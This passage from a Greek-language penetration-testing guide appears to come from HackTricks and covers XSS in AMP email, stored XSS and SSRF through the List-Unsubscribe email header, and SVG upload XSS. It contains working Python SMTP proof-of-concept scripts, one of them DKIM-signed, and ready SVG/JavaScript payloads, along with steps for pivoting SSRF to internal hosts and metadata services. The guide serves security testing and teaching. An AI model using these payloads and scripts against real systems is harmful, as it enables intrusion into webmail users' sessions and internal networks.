Εάν δεν μπορείτε να εισάγετε HTML tags ίσως αξίζει να δοκιμάσετε να **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

Το AMP, που στοχεύει στην επιτάχυνση της απόδοσης ιστοσελίδων σε κινητές συσκευές, ενσωματώνει HTML tags συμπληρωμένα από JavaScript για να διασφαλίσει λειτουργικότητα με έμφαση στην ταχύτητα και την ασφάλεια. Υποστηρίζει μια σειρά από components για διάφορα χαρακτηριστικά, προσβάσιμα μέσω [AMP components](https://amp.dev/documentation/components/?format=websites).

Η μορφή [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) επεκτείνει συγκεκριμένα AMP components στα emails, επιτρέποντας στους παραλήπτες να αλληλεπιδρούν με το περιεχόμενο απευθείας μέσα στα emails.

Παράδειγμα [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

Το RFC 2369 `List-Unsubscribe` header ενσωματώνει attacker-controlled URIs που πολλοί webmail και mail clients μετατρέπουν αυτόματα σε κουμπιά "Unsubscribe". Όταν αυτές οι URIs αποδίδονται ή ανακτώνται χωρίς έλεγχο, το header γίνεται σημείο injection τόσο για stored XSS (αν ο σύνδεσμος unsubscribe τοποθετηθεί στο DOM) όσο και για SSRF (αν ο server εκτελεί το αίτημα unsubscribe εκ μέρους του χρήστη).

#### Stored XSS via `javascript:` URIs

1. **Send yourself an email** όπου το header δείχνει σε `javascript:` URI, διατηρώντας το υπόλοιπο μήνυμα αβλαβές ώστε τα spam filters να μην το απορρίψουν.
2. **Ensure the UI renders the value** (πολλοί clients το εμφανίζουν σε ένα πλαίσιο "List Info") και ελέγξτε αν το προκύπτον `<a>` tag κληρονομεί attacker-controlled attributes όπως `href` ή `target`.
3. **Trigger execution** (π.χ., CTRL+click, middle-click, ή "open in new tab") όταν ο σύνδεσμος χρησιμοποιεί `target="_blank"`· τα browsers θα αξιολογήσουν το παρεχόμενο JavaScript στο origin της εφαρμογής webmail.
4. Παρατηρήστε το primitive stored-XSS: το payload παραμένει μαζί με το email και απαιτεί μόνο ένα κλικ για να εκτελεστεί.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Το byte νέας γραμμής (`%0a`) στο URI δείχνει ότι ακόμα και ασυνήθιστοι χαρακτήρες επιβιώνουν στο rendering pipeline σε ευάλωτους clients όπως το Horde IMP H5, που θα εμφανίσει τη συμβολοσειρά αυτούσια μέσα στην ετικέτα <a>.

<details>
<summary>Ελάχιστο SMTP PoC που παραδίδει μια κακόβουλη κεφαλίδα List-Unsubscribe</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Server-side unsubscribe proxies -> SSRF

Ορισμένοι clients, όπως η εφαρμογή Nextcloud Mail, κάνουν proxy τη λειτουργία unsubscribe από την πλευρά του server: το πάτημα του κουμπιού διατάσσει τον server να κάνει fetch το παρεχόμενο URL ο ίδιος. Αυτό μετατρέπει το header σε SSRF primitive, ιδιαίτερα όταν οι administrators θέτουν `'allow_local_remote_servers' => true` (καταγεγραμμένο στο [HackerOne report 2902856](https://hackerone.com/reports/2902856)), το οποίο επιτρέπει αιτήματα προς loopback και RFC1918 ranges.

1. **Δημιουργήστε ένα email** όπου `List-Unsubscribe` στοχεύει ένα endpoint ελεγχόμενο από τον attacker (για blind SSRF χρησιμοποιήστε Burp Collaborator / OAST).
2. **Κρατήστε το `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** ώστε το UI να εμφανίζει ένα κουμπί unsubscribe με ένα κλικ.
3. **Ικανοποιήστε τις απαιτήσεις εμπιστοσύνης**: το Nextcloud, για παράδειγμα, εκτελεί HTTPS unsubscribe requests μόνο όταν το μήνυμα περνάει DKIM, οπότε ο attacker πρέπει να υπογράψει το email χρησιμοποιώντας ένα domain που ελέγχει.
4. **Παραδώστε το μήνυμα σε ένα mailbox που επεξεργάζεται ο target server** και περιμένετε μέχρι ένας χρήστης να πατήσει το κουμπί unsubscribe.
5. **Παρατηρήστε το server-side callback** στο collaborator endpoint, και στη συνέχεια pivot προς εσωτερικές διευθύνσεις όταν το primitive επιβεβαιωθεί.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>Μήνυμα List-Unsubscribe υπογεγραμμένο με DKIM για δοκιμή SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Σημειώσεις δοκιμών**

- Χρησιμοποιήστε ένα OAST endpoint για να συλλέξετε blind SSRF hits, και στη συνέχεια προσαρμόστε το URL `List-Unsubscribe` ώστε να στοχεύει `http://127.0.0.1:PORT`, metadata services, ή άλλους internal hosts μόλις το primitive επιβεβαιωθεί.
- Επειδή το unsubscribe helper συχνά επαναχρησιμοποιεί το ίδιο HTTP stack με την εφαρμογή, κληρονομείτε τις proxy settings, τα HTTP verbs, και τα header rewrites της, επιτρέποντας περαιτέρω traversal tricks που περιγράφονται στο [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS μεταφόρτωση αρχείων (svg)

Μεταφορτώστε ως εικόνα ένα αρχείο όπως το παρακάτω (από [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Βρείτε **περισσότερα SVG payloads στο** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Διάφορα JS Tricks & Σχετικές Πληροφορίες


{{#ref}}
other-js-tricks.md
{{#endref}}

## Πόροι XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Αναφορές

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
